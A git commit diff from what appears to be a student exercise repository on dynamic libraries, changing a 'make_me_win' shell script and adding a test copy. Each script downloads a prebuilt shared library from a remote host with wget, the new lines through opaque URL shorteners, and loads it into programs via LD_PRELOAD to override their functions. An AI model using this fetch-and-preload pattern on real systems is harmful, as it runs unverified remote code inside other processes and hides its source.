53944d9edac7d901ad4b2fbc966a950d09b8f937
Abubakar Adam Sani <Athernee@gmail.com>
2023-06-20 08:31:11 +0000

    modified 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+wget -P /tmp https://t.ly/Hybk5
 export LD_PRELOAD=/tmp/hacked.so
---
+++ 0x18-dynamic_libraries/test/101-make_me_win.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget -O /tmp/libmega_mil.so https://t.ly/_Yi-
+export LD_PRELOAD=/tmp/libmega_mil.so
